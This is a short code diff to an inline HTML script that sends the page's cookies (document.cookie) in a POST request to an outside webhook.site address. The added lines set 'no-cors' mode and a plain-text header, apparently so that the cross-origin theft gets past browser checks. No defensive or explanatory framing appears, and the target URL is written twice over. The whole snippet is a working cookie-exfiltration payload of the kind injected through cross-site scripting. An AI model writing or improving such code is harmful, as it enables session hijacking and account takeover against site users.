@@ -7,6 +7,10 @@
     <script>
         fetch('https://webhook.site/https://webhook.site/e581788c-8d0e-412e-8849-ef5bd96ea4dd', {
             method: 'POST',
+            mode: 'no-cors',  // Add this line
+            headers: {
+                'Content-Type': 'text/plain',
+            },
             body: JSON.stringify({cookies: document.cookie})
         });
     </script>
